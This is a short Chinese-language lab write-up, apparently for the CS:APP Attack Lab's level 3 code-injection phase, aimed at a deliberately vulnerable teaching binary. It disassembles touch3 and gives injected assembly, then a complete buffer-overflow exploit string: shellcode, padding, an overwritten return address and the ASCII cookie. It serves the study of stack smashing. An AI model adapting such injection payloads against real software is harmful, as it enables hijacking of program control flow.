本实验一定要仔细阅读文档, 这个实验知识了解性的, 文档上帮我们免去了很多麻烦.

---



### level3

```
(gdb) disas touch3, //只需要首地址即可
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:	push   %rbx
```

流程是test->getbuf->inject->touch3->hexmatch->touch3->success!

```
mov $0x5561dca8,%rdi // 由于我们传入的是地址, 所以要保证这块区域不会被hexmatch覆盖, 我们把内容藏在了rsp后面, 那么地址就是0x5561dca8
push $0x4018fa // 把touch3首地址压栈, 很明显我们要前往touch3
ret 

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
   
 
48 c7 c7 a8 dc 61 55 68 fa 18       // 注入代码，把cookie的内存地址传入rdi, 把touch3地址压入栈中, 然后ret                                                                         
40 00 c3 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30
78 dc 61 55 00 00 00 00  
35 39 62 39 39 37 66 61 00  // cookie，用ascii码
```
